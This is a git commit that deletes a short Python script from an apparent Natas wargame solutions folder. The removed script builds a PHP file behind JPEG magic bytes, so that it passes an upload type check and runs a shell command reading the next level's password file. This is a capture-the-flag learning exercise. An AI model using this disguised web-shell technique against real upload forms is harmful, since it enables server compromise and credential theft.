402c8afa5531fa1ac0e4b23922cca059d7912af4
Jean <Jean13@users.noreply.github.com>
2017-03-06 16:16:23 -0400

    Delete php-jpeg-trick.py

--- Natas_Scripts/php-jpeg-trick.py
+++
@@ -1,8 +0,0 @@
-# Tricks programs into believing the PHP code is a JPEG.
-
-trick = open('13owned.php', 'w')
-
-trick.write('\xFF\xD8\xFF\xE0' + '<?php echo exec("cat /etc/natas_webpass/natas14"); ?>')
-
-trick.close
-
